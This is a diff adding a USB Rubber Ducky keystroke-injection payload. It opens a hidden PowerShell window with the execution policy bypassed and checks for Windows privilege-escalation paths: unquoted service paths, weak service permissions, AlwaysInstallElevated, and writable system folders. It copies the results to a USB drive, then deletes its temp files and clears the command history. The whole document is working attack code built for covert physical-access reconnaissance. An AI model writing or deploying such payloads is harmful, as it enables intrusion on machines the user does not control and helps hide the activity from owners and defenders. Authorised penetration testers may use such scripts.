@@ -1,0 +1,71 @@
+# ============================================
+# WINDOWS PRIVESC CHECK - Find Escalation Paths
+# ============================================
+# Purpose: Find privilege escalation opportunities
+# Time: 30 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+STRING $td = "$env:TEMP\.pe"; md $td -Force
+ENTER
+DELAY 200
+
+# Check for unquoted service paths
+STRING "UNQUOTED SERVICE PATHS:" | Out-File "$td\pe.txt"
+ENTER
+STRING Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } | Select-Object Name, PathName | Out-File "$td\pe.txt" -Append
+ENTER
+DELAY 500
+
+# Check for weak service permissions
+STRING "`nWEAK SERVICE PERMISSIONS:" | Out-File "$td\pe.txt" -Append
+ENTER
+STRING Get-Service | Where-Object { $_.Status -eq "Running" } | ForEach-Object { 
+ENTER
+STRING   $acl = Get-Acl "\\.\service\$($_.Name)" -ErrorAction SilentlyContinue
+ENTER
+STRING   if ($acl -and $acl.Access -match "Everyone|Users") { $_.Name }
+ENTER
+STRING } | Out-File "$td\pe.txt" -Append
+ENTER
+DELAY 1000
+
+# Check for AlwaysInstallElevated
+STRING "`nALWAYS INSTALL ELEVATED:" | Out-File "$td\pe.txt" -Append
+ENTER
+STRING if ((Get-ItemProperty HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated) { "ENABLED" } else { "Disabled" } | Out-File "$td\pe.txt" -Append
+ENTER
+DELAY 200
+
+# Check for writable system folders
+STRING "`nWRITABLE SYSTEM FOLDERS:" | Out-File "$td\pe.txt" -Append
+ENTER
+STRING "C:\Windows\Temp", "C:\ProgramData", "C:\Windows\System32\drivers\etc" | ForEach-Object { 
+ENTER
+STRING   if (Test-Path $_) { 
+ENTER
+STRING     try { [System.IO.File]::WriteAllText("$_\test.txt", "test"); Remove-Item "$_\test.txt"; $_ } catch {} 
+ENTER
+STRING   }
+ENTER
+STRING } | Out-File "$td\pe.txt" -Append
+ENTER
+DELAY 500
+
+# Copy to USB
+STRING if (Test-Path E:\) { Copy-Item "$td\pe.txt" "E:\privesc.txt" -Force }
+ENTER
+DELAY 300
+
+STRING Remove-Item $td -Recurse -Force
+ENTER
+STRING Clear-History; exit
+ENTER
